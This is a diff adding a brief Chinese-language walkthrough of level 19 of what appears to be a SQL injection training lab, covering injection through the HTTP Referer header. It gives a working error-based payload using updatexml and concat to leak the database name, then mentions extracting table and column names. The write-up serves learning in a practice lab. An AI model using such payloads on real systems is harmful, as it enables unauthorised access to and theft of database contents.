@@ -1,0 +1,16 @@
+第19关
+
+头部注入
+
+根据提示referer信息
+
+在头部添加referer
+
+爆出数据库
+Referer: 'and updatexml(1,concat(0x7e,database(),0x7e),1)) #
+
+然后爆表名列名信息等
+
+
+
+闯关成功！！！
